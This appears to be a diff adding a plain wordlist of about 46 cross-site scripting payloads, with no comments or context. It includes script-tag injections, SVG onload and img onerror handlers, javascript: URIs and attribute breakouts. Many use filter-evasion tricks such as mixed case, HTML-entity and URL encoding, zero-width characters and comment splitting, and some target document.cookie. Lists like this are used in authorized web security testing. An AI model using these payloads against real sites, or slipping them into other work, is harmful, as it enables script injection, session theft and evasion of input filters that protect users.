@@ -1,0 +1,46 @@
+"*alert(1)*"
+xss"*alert(document.cookie)*"
+"^prompt(9)^"
+"*alert(1)*"
+"!=prompt(9)!="
+"/prompt(9)/"
+***prompt(9)***"
+</script><script>alert(document.cookie)</script>
+<Svg+On+Only=1+0nload=alert(1)>
+<svg/onload​=prompt(1)>
+<Svg+On+Only=1+0nload=alert("hex")>
+<svg/onload​=alert&#x2F;**&#47;(5)>
+<svg%20onload=prompt%26%230000000040document.domain)>
+<svg/onload​=alert/&#42;&#42;/(4)>
+<svg/onload​=alert&sol;**&sol;(3)>
+"><body/onload="{x:onerror=alert};x"
+<script>alert(1)</script>
+34<%2FScriPt><sCripT+class%3XSS>alert%281%29<%2FsCriPt>
+<svg onload=alert(1)>
+"><svg onload=alert(1)//
+<svg onload=prompt%26%230000000040document.domain)> 
+"onmouseover=alert(1)//
+"autofocus/onfocus=alert(1)//
+'-alert(1)-'
+'-alert(1)//
+\'-alert(1)//
+<script>alert("XSSED:D:")</script>
+<ScRipT>alert("XSSE:D");</ScRipT>
+<script>alert("XSSED:D");</script>
+<script>alert(“XSSED”)</script>
+<svg/onload​=alert//&NewLine;(2)>
+<svg/onload​=alert/*1337*/(1)>
+<script>alert(“XSSED”);</script>
+<script>alert(‘XSSED’)</script>
+“><script>alert(“XSSED”)</script>
+<script>alert(/XSSED”)</script>
+<script>alert(/XSSED/)</script>
+</script><script>alert("XSSED")</script>
+‘; alert("XSSED");
+‘)alert("XSSED");//
+<ScRiPt>alert("XSSED")</sCriPt>
+<IMG SRC=jAVasCrIPt:alert(‘XSSED’)>
+<IMG SRC=”javascript:alert(‘XSSED’);”>
+<IMG SRC=javascript:alert(&quot;XSSED&quot;)>
+<IMG SRC=javascript:alert(‘XSSED’)>
+<img src=xss onerror=alert("XSSED")>
